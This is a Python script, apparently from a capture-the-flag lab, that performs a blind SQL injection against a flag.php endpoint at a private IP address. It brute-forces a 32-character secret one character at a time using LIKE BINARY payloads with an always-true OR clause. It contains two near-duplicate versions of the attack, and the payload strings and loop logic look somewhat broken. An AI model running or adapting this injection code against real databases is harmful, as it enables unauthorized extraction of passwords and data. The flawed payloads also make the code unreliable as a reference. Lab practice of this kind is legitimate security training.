#blind sql injection problem
#blind sql injection problem
import requests
import sys
from string import *
# #found on https://axcheron.github.io/writeups/otw/natas/
def blind():
    url = "http://10.12.0.30/flag.php"
    charset = ascii_lowercase + ascii_uppercase + digits
    passwd = ''

    for j in range(32):
        for i in charset:
            data = {"flag": "'value LIKE BINARY '{}%'#' ' OR '1' = '1".format(passwd+i)}
            requests.session()
            resp = requests.post(url, data = data)
            print(resp.text)
            if 'exists' in resp.text:
                passwd += i
                print(passwd)
                continue
blind()

# requests.session()
# url = "http://10.12.0.30/flag.php"
# data = {"flag": "'' ' OR '1' = '1 AND password LIKE '' #"}
# resp = requests.post(url, data = data )
# print(resp.text)
#blind sql injection problem
import requests
import sys
from string import digits, ascii_lowercase, ascii_uppercase
#found on https://axcheron.github.io/writeups/otw/natas/

url = "http://10.12.0.30/flag.php"
charset = ascii_lowercase + ascii_uppercase + digits
# sqli = "'' ' OR '1' = '1 AND value LIKE BINARY '"
sqli = "SELECT * FROM value WHERE flag LIKE BINARY '{}%' '' ' OR '1' = '1"
password = ""
# We assume that the password is 32 chars 
while len(password) < 32:
	for char in charset:
		requests.session()
		resp = requests.post(url, data={'flag':sqli + password + char + "%"})
		print(resp.text)
		if "This user exists" in resp.text:
			sys.stdout.write(char)
			sys.stdout.flush()
			password += char
			break
print(f"The password is:",password)